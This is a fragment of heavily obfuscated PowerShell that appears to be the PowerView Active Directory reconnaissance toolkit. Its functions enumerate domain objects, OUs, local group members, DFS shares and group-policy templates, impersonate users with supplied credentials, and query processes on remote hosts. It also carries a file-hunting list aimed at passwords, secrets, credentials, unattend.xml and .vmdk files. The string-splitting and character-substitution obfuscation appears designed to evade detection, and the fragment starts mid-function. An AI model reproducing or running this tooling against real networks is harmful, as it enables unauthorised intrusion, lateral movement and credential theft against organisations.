        }

        YoV{LIJKogonIJKTOken} = YoV{nUIJKLL}
        if (YoV{PsboIJKUndIJKpAIJKRAMETIJKerS}[(Z3b{0}{2}{1}Z3b -fS5zCreS5z,S5ztialS5z,S5zdenS5z)]) {
            if (YoV{PsbouIJKNIJKDIJKpArameterS}[(Z3b{1}{0}Z3b -f S5zlayS5z,S5zDeS5z)] -or YoV{PsbouNIJKdPIJKArAIJKmeIJKTERs}[(Z3b{3}{2}{0}{1}Z3b -f S5zSucS5z,S5zcessS5z,S5zopOnS5z,S5zStS5z)]) {
                YoV{LogOIJKNTIJKOkEN} = &(Z3b{1}{3}{5}{2}{4}{6}{0}Z3b -f S5ztionS5z,S5zInS5z,S5zmpeS5z,S5zvS5z,S5zrsoS5z,S5zoke-UserIS5z,S5znaS5z) -Credential YoV{crIJKEDenTIJKial}
            }
            else {
                YoV{lIJKoGOIJKNTIJKOken} = &(Z3b{3}{4}{1}{0}{2}{5}Z3b-f S5zImpersS5z,S5z-UserS5z,S5zonatiS5z,S5zInvS5z,S5zokeS5z,S5zonS5z) -Credential YoV{CreDIJKEIJKNIJKTIal} -Quiet
            }
        }
    }

    PROCESS {
        
        if (YoV{PIJKsboIJKUNDpAIJ','.Invoke(), [Int],   (&(Z3b{1}{0}{2}{3}Z3b-fS5zVarS5z,S5zGet-S5z,S5zIS5z,S5zABlES5z) r269f).Z3bVIJKAlUeZ3b.(Z3b{0}{2}{1}{3}Z3b-f S5zMakeByReS5z,S5zTyS5z,S5zfS5z,S5zpeS5z).Invoke(),   YoV{R26IJK9F}.(Z3b{1}{0}{2}Z3b -f S5zTyS5z,S5zMakeByRefS5z,S5zpeS5z).Invoke(),   (&(Z3b{0}{1}Z3b -f S5zvARiAblS5z,S5zES5z) r269f).Z3bvAlIJKUeZ3b.(Z3b{1}{0}{2}Z3b -f S5zRefTS5z,S5zMakeByS5z,S5zypeS5z).Invoke())),
    (&(Z3b{0}{1}Z3b -f S5zfS5z,S5zuncS5z) (Z3b{0}{1}{2}Z3b -fS5znetS5z,S5zapi3S5z,S5z2S5z) (Z3b{0}{2}{1}Z3b-f S5zDsGS5z,S5zeS5z,S5zetSiteNamS5z) ([Int]) @([String],  (','f S5zNetLocalGroS5z,S5zuS5z,S5zpS5z,S5zsS5z,S5zGetMemberS5z) ([Int]) @([String], [String], [Int],   (&(S5zGiS5z) VaRiablE:6rk25P  ).Z3bVIJKAlUEZ3b.(Z3b{1}{3}{2}{0}Z3b-f S5zTypeS5z,S5zMakeByS5z,S5zfS5z,S5zReS5z)','-S5z,S5zableS5z) gtW2  -vaLuEOnL )::Z3bGETIJKPRIJKOIJKPeRtyZ3b, YoV{nuIJKLl}, YoV{tIJKemP}, YoV{NIJKUlL})
                    [Int32]YoV{LIJKOW}  = YoV{teIJKmP}.(Z3b{0}{2}{1}Z3b -fS5zGeS5z,S5zTypeS5z,S5ztS5z).Invoke().(Z3b{2}{1}{0}Z3b-f S5zmberS5z,S5zokeMeS5z,S5zInvS5z).Invoke((Z3b{1}{0}Z3b -fS5zPartS5z,S5zLowS5z),    (&(Z3b{0}{1}{2}Z3b-f S5zgES5z,S5zt-itS5z,S5zEmS5z)  vaRiaBLE:Gtw2).Z3bvAlIJKUeZ3b::Z3bGeTIJKPIJKRoPeRtYZ3b, YoV{NUIJKLL}, YoV{TEIJKmP}, YoV{nIJKUlL})
                    YoV{objIJKEcTpIJKRoPERIJKTiEs}[YoV{_}] = (  (&(Z3b{0}{1}Z3b -f S5zDiS5z,S5zrS5z) vARIAble:7dvciE  ).Z3bVIJKAlUEZ3b::Z3bfrIJKoIJKmfIlETIIJKmEZ3b([Int64](Z3b0x{0:x8}{1:x8}Z3b -f YoV{hIJKiGH}, YoV{LIJKOW})))
                }
                else {
                    
                    YoV{OIJKBJIJKecTpRoPeIJKRtIJKIes}[YoV{_}] = (  ( &(Z3b{0}{2}{1}Z3b-f S5zgeS5z,S5zariaBLeS5z,S5zt-VS5z)  (Z3b7dvciZ3b+Z3beZ3b) -ValueOn )::Z3bfIJKRoMfILEtiIJKMeZ3b((YoV{PIJKROpEIJKRTIJKIes}[YoV{_}][0])))
                }
            }
            elseif (YoV{PIJKRopeIJKRtIES}[YoV{_}][0] -is [System.MarshalByRefObject]) {
                
                YoV{PIJKRop} = YoV{PROPErTIJKIIJKes}[YoV{_}]
                try {
                    YoV{tEIJKMp} = YoV{pRIJKoP}[YoV{_}][0]
                    [Int32]YoV{hIIJKGh} = YoV{TIJKEmP}.(Z3b{0}{2}{1}Z3b-f S5zGetTS5z,S5zpeS5z,S5zyS5z).Invoke().(Z3b{1}{0}{2}Z3b -f S5zkeMemS5z,S5zInvoS5z,S5zberS5z).Invoke((Z3b{1}{0}{2}Z3b -fS5zighParS5z,S5zHS5z,S5ztS5z),  (&(Z3b{1}{3}{0}{2}Z3b -fS5zIldIteS5z,S5zGETS5z,S5zMS5z,S5z-ChS5z)  variABle:gtw2).Z3bValIJKUeZ3b::Z3bGEtPrIJKoPeIJKRIJKTYZ3b, YoV{nIJKUll}, YoV{TEIJKmP}, YoV{nIJKUlL})
                    [Int32]YoV{lIJKoW}  = YoV{TeIJKmP}.(Z3b{1}{2}{0}Z3b-fS5zypeS5z,S5zGS5z,S5zetTS5z).Invoke().(Z3b{3}{1}{2}{0}Z3b -f S5zmberS5z,S5zkS5z,S5zeMeS5z,S5zInvoS5z).Invoke((Z3b{0}{1}Z3b-fS5zLowPaS5z,S5zrtS5z),   ( &(S5zlSS5z)  (Z3bVAriAbLZ3b+Z3bE:GtwZ3b+Z3b2Z3b)  ).Z3bvaIJKlueZ3b::Z3bgeTIJKPrIJKoIJKPE',' ','PWStrS5z))
    (Z3b{2}{1}{3}{0}Z3b-f S5zentS5z,S5zgrpiS5z,S5zlS5z,S5z1_commS5z) = &(Z3b{1}{0}Z3b-f S5zeldS5z,S5zfiS5z) 1 (Z3b{1}{0}Z3b-fS5zgS5z,S5zStrinS5z) -MarshalAs @((Z3b{2}{1}{0}Z3b -fS5zStrS5z,S5zWS5z,S5zLPS5z))
}


YoV{lIJKOIJKcIJKAlgroUPIJK_MIJKEmIJKBers_INFO_2} = &(Z3b{2}{1}{0}Z3b -fS5zuctS5z,S5zrS5z,S5zstS5z) YoV{MIJKOd} (Z3b{1}{7}{2}{6}{4}{5}{0}{3}Z3b-f S5zFO_S5z,S5zLOCALGS5z,S5z_S5z,S5z2','-fS5zesS5z,S5zltPageSizeS5z,S5zuS5z,S5zRS5z)]) { YoV{USIJKeRIJKSeaIJKRchERARGIJKUmIJKENIJKTs}[(Z3b{0}{2}{1}{3}{4}Z3b-fS5zReS5z,S5zgS5z,S5zsultPaS5z,S5zeSizS5z,S5zeS5z)] = YoV{RIJKEIJKsuIJKlTPAGIJKEsIZe} }
        if (YoV{pSBouIJKNIJKDPaIJKRAmETEIJKRs}[(Z3b{3}{4}{0}{2}{1}Z3b-f S5zTimeS5z,S5zitS5z,S5zLimS5z,S5zSerS5z,S5zverS5z)]) { YoV{UseRIJKsIJKEaRcHERaIJKRguMIJKENtS}[(Z3b{1}{4}{3}{2}{0}Z3b -f S5zmitS5z,S5zSerS5z,S5zLiS5z,S5zTimeS5z,S5zverS5z)] = YoV{SeRveRTIIJKMIJKeIJKLIJKimIT} }
        if (YoV{psIJKBOuNdpARIJKAmetIJKERs}[(Z3b{2}{1}{0}Z3b-f S5zoneS5z,S5zstS5z,S5zTombS5z)]) { YoV{UsERsIJKeaRIJKChErarGuIJKMEnIJKTS}[(Z3b{1}{0}Z3b -f S5zeS5z,S5zTombstonS5z)] = YoV{TIJKombStIJKOIJKNE} }
        if (YoV{PSBIJKOuNIJKdpIJKAIJKRameteIJKRS}[(Z3b{2}{0}{1}Z3b -f S5ztiS5z,S5zalS5z,S5zCredenS5z)]) { YoV{UIJKserIJKsIJKEArChEIJKRARIJKGumenIJKTS}[(Z3b{1}{0}{2}Z3b-fS5zntiaS5z,S5zCredeS5z,S5zlS5z)] = YoV{CIJKREIJKdeIJKNTIAL} }

        YoV{taIJKRGIJKETCOIJKMpIJKUTERS} = @()

        
        if (YoV{PsbIJKoUnDPIJKARIJKAMEIJKTErS}[(Z3b{0}{2}{1}Z3b-f S5zCS5z,S5zeS5z,S5zomputerNamS5z)]) {
            YoV{TARgEIJKTIJKco','z,S5zchTS5z,S5zSearS5z,S5zsS5z}, {Z3b{0}{1}Z3b-fS5zTeS5z,S5zrmsS5z})]
        [String[]]
        YoV{iNIJKClIJKUDe} = @((Z3b{0}{2}{1}Z3b -f S5z*pS5z,S5zsword*S5z,S5zasS5z), (Z3b{2}{1}{3}{0}Z3b -fS5zitive*S5z,S5znS5z,S5z*seS5z,S5zsS5z), (Z3b{0}{1}{2}Z3b -f S5z*aS5z,S5zdminS5z,S5z*S5z), (Z3b{2}{0}{1}Z3b -fS5zgiS5z,S5zn*S5z,S5z*loS5z), (Z3b{1}{0}{2}Z3b -fS5zreS5z,S5z*secS5z,S5zt*S5z), (Z3b{1}{0}{2}Z3b-f S5zend*.S5z,S5zunattS5z,S5zxmlS5z), (Z3b{0}{1}Z3b-fS5z*S5z,S5z.vmdkS5z), (Z3b{0}{1}Z3b-f S5z*credS5z,S5zs*S5z), (Z3b{1}{0}{2}Z3b -fS5zcredentiS5z,S5z*S5z,S5zal*S5z), (Z3b{1}{0}{2}Z3b -fS5zoS5z,S5z*.cS5z,S5znfigS5z)),

        [Parameter(PArAmEteRseTNAME = Z3bfIleSIJKpeCIJKiIJKFIIJKcatiIJKOnZ3b)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{LAStIJKACIJKCEIJKsStIJKImE},

        [Parameter(PArAmETErsETNAmE = Z3bfILIJKeSpIJKEIJKcIficaIJKTIoNZ3b)]
        [ValidateNotNullOrEmp','z) (S5z[GS5z+S5zet-DomaiS5z+S5znSearcS5z+S5zhS5z+S5zerS5z+S5z] S5z+S5zsS5z+S5zearch S5z+S5zbaseS5z+S5z: S5z+Z3bYoVSearchStringZ3b)

        if (YoV{CrIJKEDeNIJKTiAl} -ne   (&(Z3b{1}{0}Z3b -f S5zrS5z,S5zDIS5z) (S5zVariS5z+S5zAbLE:S5z+S5zjfS5z+S5zIS5z)).Z3bvAIJKLueZ3b::Z3bEmIJKptyZ3b) {
            &(Z3b{1}{2}{0}Z3b -f S5z-VerboseS5z,S5zWritS5z,S5zeS5z) (Z3b{5}{17}{16}{13}{4}{9}{14}{3}{8}{15}{19}{20}{18}{2}{11}{7}{6}{0}{10}{12}{1}Z3b-f S5zoS5z,S5znS5z,S5ziS5z,S5zinS5z,S5ziS5z,S5z[S5z,S5z fS5z,S5zlsS5z,S5zgS5z,S5znSS5z,S5zr LDAP conS5z,S5zaS5z,S5znectioS5z,S5zDomaS5z,S5zearcher] UsS5z,S5z alS5z,S5zt-S5z,S5zGeS5z,S5zdentS5z,S5zternate cS5z,S5zreS5z)
            
            YoV{DIJKOmIJKAINIJKoBjECT} = &(Z3b{0}{1}{2}Z3b-f S5zNew-S5z,S5zObjeS5z,S5zctS5z) (Z3b{1}{2}{5}{3}{0}{4}Z3b -fS5zervicS5z,S5zDS5z,S5zirS5z,S5zSS5z,S5','        if (YoV{PsIJKBoUNDIJKpIJKAIJKRaMIJKeTERs}[(Z3b{1}{0}Z3b-fS5znS5z,S5zDomaiS5z)]) {
            if (YoV{psboIJKUIJKNdParIJKAIJKMetErS}[(Z3b{2}{1}{0}Z3b-f S5zlS5z,S5ztiaS5z,S5zCredenS5z)]) {
                YoV{TArgETfIJKoRIJKeST} = &(Z3b{0}{1}{3}{2}Z3b-f S5zGeS5z,S5ztS5z,S5zinS5z,S5z-DomaS5z) -Domain YoV{DoMaIJKiN} JGO &(Z3b{2}{0}{3}{1}Z3b -fS5zbS5z,S5ztS5z,S5zSelect-OS','znS5z,S5zDomaiS5z)] = YoV{TAIJKRIJKgeTdOIJKMAiN}
                if (YoV{VeIJKRSIIJKoN} -match (((Z3b{0}{1}{2}Z3b -fS5zallS5z,S5zeuS5z,S5zj1S5z)) -cReplACe  ([CHaR]101+[CHaR]117+[CHaR]106),[CHaR]124)) {
                    YoV{DfSsIJKhIJKArES} += &(Z3b{5}{2}{3}{1}{4}{0}Z3b-f S5zV1S5z,S5zDomainDFSShS5z,S5zeS5z,S5zt-S5z,S5zareS5z,S5zGS5z) @SearcherArguments
                }
                if (YoV{VErIJKSION} -match (((Z3b{0}{1}Z3b -f S5zalS5z,S5zl2yZ2S5z)) -REPlaCE([CHAr]50+[CHAr]121+[CHAr]90),[CHAr]124)) {
                    YoV{dfIJKssHAIJKRES} += &(Z3b{1}{0}{3}{2}{4}Z3b-f S5zmaS5z,S5zGet-DoS5z,S5zFSSharS5z,S5zinDS5z,S5zeV2S5z) @SearcherArguments
                }
            }
        }
        else {
            if (YoV{verIJKsiIJKOn} -match (((Z3b{1}{0}{2}Z3b -fS5zl{0S5z,S5zalS5z,S5z}1S5z)) -F  [ChaR]124)) {
                YoV{dFsSIJKhArIJKEs} += &(Z3b{0}{3}{2}{4}{1}Z3b-fS5zGet-DS5z,S5zeV1S5z,S5zainDFSS5z,S5zomS5z,S5zSharS5z) @SearcherArguments
            }
            if (YoV{veIJKRsIIJKon} -match (((Z3b{0}{1}Z3b-fS5zallgS5z,S5zcy2S5z))-CREplAcES5zgcyS5z,[ChaR]124)) {
                YoV{dIJKFIJKsIJKShAreS} += &(Z3b{4}{1}{3}{0}{2}Z3b-f S5zSShS5z,S5z-DomS5z,S5zareV2S5z,S5zainDFS5z,S5zGetS5z) @SearcherArguments
            }
        }

        YoV{DIJKFSsIJKHAIJKReS} JGO &(Z3b{0}{1}{2}Z3b-f S5zSorS5z,S5zt-ObjecS5z,S5ztS5z) -Property ((Z3b{2}{1}{0}Z3b -f S5zeS5z,S5zNamS5z,S5zRemoteServerS5z),(Z3b{0}{1}Z3b-fS5zNamS5z,S5zeS5z)) -Unique
    }
}








function gEt-GPIJKTIJKTMpL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{0}{1}{3}Z3b -f S5zShouldProS5z,S5zcesS5z,S5zPSS5z,S5zsS5z}, S5zS5z)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(manDAtory = YoV{TIJKRuE}, vaLueFRompIPElinE = YoV{tIJKRue}, VaLUEFroMpIpELIneByProPeRTYnaME = YoV{TIJKRuE})]
        [Alias({Z3b{2}{4}{3}{0}{1}Z3b -f S5zsS5z,S5zyspathS5z,S5zgpcS5z,S5zileS5z,S5zfS5z}, {Z3b{1}{0}Z3b -f S5zhS5z,S5zPatS5z})]
        [String]
        YoV{g','S5z,S5zServS5z)]) { YoV{GIJKROUpsEAIJKRIJKcIJKHeRARgumeIJKNIJKTS}[(Z3b{0}{1}{2}Z3b -fS5zSeS5z,S5zrS5z,S5zverS5z)] = YoV{sEIJKRVIJKer} }
            if (YoV{PIJKsBIJKOUIJKNDPARAmeIJKTERs}[(Z3b{1}{3}{0}{2}Z3b-fS5zaS5z,S5zSS5z,S5zrchScopeS5z,S5zeS5z)]) { YoV{gIJKRoIJKUPsEIJKArCherAIJKRIJKgUmEIJKNtS}[(Z3b{1}{2}{3}{0}Z3b-f S5zeS5z,S5zSS5z,S5zearchScoS5z,S5zpS5z)] = YoV{SIJKEaIJKRcHIJKscOPe} }
            if (YoV{pIJKSIJKBoUNdPaIJKRAmETIJKErs}[(Z3b{3}{0}{2}{1}Z3b -fS5zulS5z,S5zzeS5z,S5ztPageSiS5z,S5zResS5z)]) { YoV{GROIJKUPSIJKeARIJKchErIJKARguMeNts}[(Z3b{4}{1}{2}{3}{0}Z3b-f S5zeS5z,S5zagS5z,S5zeSS5z,S5zizS5z,S5zResultPS5z)] = YoV{rIJKEsIJKULTPagIJKEsizE} }
            if (YoV{PsboIJKUIJKNdpaRIJKAmIJKeTIJKERs}[(Z3b{4}{2}{1}{3}{0}Z3b-f S5ztS5z,S5zeLS5z,S5zimS5z,S5zimiS5z,S5zServerTS5z)]) { YoV{GRIJKOUPIJKsIJKeARchERAIJKRgUmeIJKNtS}[(Z3b{0}{2}{3}{1}Z3b -f S5zServS5z,S5zimeLimitS5z,S5zerS5z,S5zTS5z)] = YoV{SIJKeIJKRverTImElImIJKiT} }
            if (YoV{PIJKSboIJKUnDIJKPAIJKRaIJKmEtERs}[(Z3b{2}{1}{0}Z3b-f S5zneS5z,S5zstoS5z,S5zTombS5z)]) { YoV{gROIJKUPSEArcIJKHErIJKAIJKRIJKgUmenIJKTs}[(Z3b{1}{0}{2}{3}Z3b -fS5zmbsS5z,S5zToS5z,S5ztS5z,S5zoneS5z)] = YoV{tOMBsIJKTIJKOne} }
            if (YoV{PSBoUIJKNDpAIJKRaMIJKetErs}[(Z3b{2}{0}{1}Z3b -fS5zentS5z,S5zialS5z,S5zCredS5z)]) { YoV{grouPsIJKEIJKAIJKRCheRaRIJKGUIJKmEnIJKTS}[(Z3b{1}{2}{0}Z3b-f S5zalS5z,S5zCS5z,S5zredentiS5z)] = YoV{CIJKREdeNIJKTIJKIal} }
            YoV{GrOIJKUpIJKseArCIJKheRAIJKRGIJKUmEIJKNTS}
            YoV{TARGEIJKTIJKUIJKSers} = &(Z3b{1}{3}{2}{0}{4}{5}Z3b-fS5zinGrS5z,S5zGeS5z,S5z-DomaS5z,S5ztS5z,S5zoupMemS5z,S5zberS5z) @GroupSearcherArguments JGO &(Z3b{0}{1}{3}{2}Z3b -f S5zSelS5z,S5zect-S5z,S5zjectS5z,S5zObS5z) -ExpandProperty (Z3b{3}{1}{2}{0}Z3b -fS5zmeS5z,S5zmberNS5z,S5zaS5z,S5zMeS5z)
        }

        
        YoV{HostENuIJKMBIJKlOcK} = {
            Param(YoV{COmIJKPuIJKTIJKeIJKRnAMe}, YoV{PIJKRocEIJKSsNAme}, YoV{tAIJKRgEtuSEIJKRS}, YoV{CIJKREdeIJKNIJKTial})

            ForEach (YoV{taRgIJKETIJKcOmIJKpIJKUTEr} in YoV{cIJKOMIJKPuTeRNaME}) {
                YoV{uP} = &(Z3b{2}{0}{1}{4}{3}Z3b -f S5zst-CS5z,S5zonS5z,S5zTeS5z,S5zionS5z,S5znectS5z) -Count 1 -Quiet -ComputerName YoV{TIJKARIJKGetcOMpuIJKTIJKER}
                if (YoV{UP}) {
                    
                    
                    if (YoV{cRIJKedENtIIJKAl}) {
                        YoV{PIJKROcEIJKsSes} = &(Z3b{4}{3}{2}{0}{1}Z3b-fS5zoceS5z,S5zssS5z,S5zPrS5z,S5z-WMIS5z,S5zGetS5z) -Credential YoV{cREIJKdIJKEIJKNtiAL} -ComputerName YoV{TaIJKRGEtCIJKOMpIJKUTer} -ErrorAction (Z3b{1}{0}{4}{2}{3}Z3b -f S5znS5z,S5zSileS5z,S5zyContiS5z,S5znueS5z,S5ztlS5z)
                    }
                    else {
               ','z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z)S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z<S5z+S5z/SupS5z+S5zpress>
 S5z+S5z S5z+S5z S5z+S5z S5z+(S5z</S5z+','S5z}, {Z3b{1}{0}{2}Z3b-fS5zvS5z,S5zOneLeS5z,S5zelS5z}, {Z3b{0}{1}Z3b-f S5zSubtreS5z,S5zeS5z})]
        [String]
        YoV{sEARIJKcHScIJKOpe} = (Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zbtreS5z,S5zSuS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rIJKEIJKSultPagIJKeSize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sErIJKVertiIJKMElIJKImit},

        [Switch]
        YoV{tIJKOmBIJKsTOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKREdeIJKNtIaL} =  (&(Z3b{0}{1}Z3b-f S5zVarIaS5z,S5zBlES5z) (Z3bjZ3b+Z3bfIZ3b)  -vaLu  )::Z3beMIJKpTYZ3b
    )

    BEGIN {
        YoV{cIJKOmMoNIJKARIJKGIJKUMEnTs} = @{}
        if (YoV{pSbIJKounIJKDpIJKAraIJKMIJKEtERS}[(Z3b{1}{0}Z3b-f S5zomainS5z,S5zDS5z)]) { YoV{CoIJKmMoNAIJKRGumEnTS}[(Z3b{1}{0}Z3b-fS5zomainS5z,S5zDS5z)] = YoV{doIJKMaIJKIN} }
        if (YoV{PsIJKBoIJKUnDpIJKARaMeIJKTIJKErs}[(Z3b{1}{0}Z3b-f S5zerS5z,S5zServS5z)]) { YoV{CIJKOmMIJKonaIJKRGuMIJKENtS}[(Z3b{2}{1}{0}Z3b -fS5zverS5z,S5zrS5z,S5zSeS5z)] = YoV{sIJKerIJKVEr} }
        if (YoV{pIJKSBOUNIJKdpaRAMETIJKeIJKRS}[(Z3b{2}{0}{1}Z3b -fS5zScoS5z,S5zpeS5z,S5zSearchS5z)]) { YoV{cIJKOIJKMmONARgIJKUMIJKENts}[(Z3b{0}{2}{1}Z3b -fS5zSS5z,S5zpeS5z,S5zearchScoS5z)] = YoV{SeaRCHIJKSCOIJKPE} }
        if (YoV{PSBIJKOIJKUNdIJKpIJKAIJKRAMeters}[(Z3b{2}{1}{4}{3}{0}Z3b -f S5zSizeS5z,S5zultPaS5z,S5zResS5z,S5zeS5z,S5zgS5z)]) { YoV{CIJKomMOnaRIJKGuMEIJKNtS}[(Z3b{0}{2}{1}Z3b -f S5zResultS5z,S5zgeSizeS5z,S5zPaS5z)] = YoV{rESuIJKlTIJKPIJKAgESIIJKZE} }
        if (YoV{PSBoIJKUIJKNdpaRAmEIJKTEIJKRs}[(Z3b{0}{1}{3}{2}Z3b -fS5zSerS5z,S5zvS5z,S5zmeLimitS5z,S5zerTiS5z)]) { YoV{cOmmOIJKNaIJKRGUmeIJKNts}[(Z3b{2}{3}{1}{4}{0}Z3b -f S5ztS5z,S5zimS5z,S5zServeS5z,S5zrTimeLS5z,S5ziS5z)] = YoV{SIJKeRIJKVErTIJKiMeLIIJKmit} }
        if (YoV{pIJKsBOUnIJKDpIJKARIJKAmETeRs}[(Z3b{0}{1}Z3b-f S5zTombstS5z,S5zoneS5z)]) { YoV{comIJKmoNArGIJKUMEIJKNTS}[(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zTS5z,S5zombstonS5z)] = YoV{tOMIJKBSTOIJKNE} }
        if (YoV{pIJKSbIJKOIJKUndParametEIJKRS}[(Z3b{2}{0}{1}Z3b -f S5zedentS5z,S5zialS5z,S5zCrS5z)]) { YoV{cOMMONarIJKguIJKmeNTs}[(Z3b{0}{1}{2}Z3b-fS5zCredS5z,S5zenS5z,S5ztialS5z)] = YoV{CReDIJKeNIJKTIJKiaL} }
    }

    PROCESS {
        YoV{tAIJKRGetIJKsidS} = @()

        if (YoV{pSIJKBouIJKN','

            if (YoV{pSboUnDPaRaIJKmEIJKTEIJKRS}[(Z3b{1}{0}{2}Z3b-f S5znS5z,S5zFiS5z,S5zdOneS5z)]) { YoV{ReSIJKULts} = YoV{oUIJKsIJKeIJKARChER}.(Z3b{0}{2}{1}Z3b-fS5zFS5z,S5zndOneS5z,S5ziS5z).Invoke() }
            else { YoV{ReIJKSULIJKTs} = YoV{OIJKUseIJKAIJKRCheR}.(Z3b{1}{0}Z3b-fS5zllS5z,S5zFindAS5z).Invoke() }
            YoV{rIJKeIJKSULtS} JGO &(Z3b{3}{0}{2}{1}Z3b-f S5zere-S5z,S5zbjectS5z,S5zOS5z,S5zWhS5z) {YoV{_}} JGO &(Z3b{0}{2}{4}{1}{3}Z3b -f S5zForES5z,S5zObS5z,S5zacS5z,S5zjectS5z,S5zh-S5z) {
                if (YoV{PIJKsBOUnIJKDIJKpArAMetEIJKRs}[S5zRawS5z]) {
                    
                    YoV{ou} = YoV{_}
                }
                else {
                    YoV{OIJKU} = &(Z3b{3}{1}{2}{0}Z3b -f S5zyS5z,S5zPProperS5z,S5ztS5z,S5zConvert-LDAS5z) -Properties YoV{_}.Z3bpROPeIJKRTIJKIESZ3b
                }
                YoV{OIJKU}.Z3bPSIJKobjEctZ3b.Z3btIJKYIJKPeNamESZ3b.(Z3b{1}{0}Z3b -f S5zertS5z,S5zInsS5z).Invoke(0, (Z3b{0}{2}{1}Z3b -fS5zPowerVS5z,S5zUS5z,S5ziew.OS5z))
                YoV{OIJKU}
            }
            if (YoV{rESIJKULIJKTs}) {
                try { YoV{reSIJKULIJKTS}.(Z3b{1}{2}{0}Z3b-f S5zseS5z,S5zdisS5z,S5zpoS5z).Invoke() }
                catch {
                    &(Z3b{0}{2}{3}{1}{4}Z3b -fS5zWriS5z,S5zVerbosS5z,S5zteS5z,S5z-S5z,S5zeS5z) (S5z[S5z+S5zGeS5z+S5zt-DomainOUS5z+S5z] S5z+S5zErroS5z+S5zr S5z+S5zdiS5z+S5zsposinS5z+S5zg S5z+S5zofS5z+S5z S5z+S5zthS5z+S5ze S5z+S5zReS5z+S5zsultsS5z+S5z S5z+S5zoS5z+S5zbjecS5z+S5zt: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{ouSIJKEaIJKRchER}.(Z3b{2}{0}{1}Z3b-fS5'))  -CrEplaCE ([chaR]73+[chaR]74+[chaR]75),[chaR]96  -CrEplaCE  '5rj',[chaR]92 -REpLAcE 'S5z',[chaR]39-CrEplaCE  'Z3b',[chaR]34-CrEplaCE  ([chaR]74+[chaR]71+[chaR]79),[chaR]124 -REpLAcE  'YoV',[chaR]36))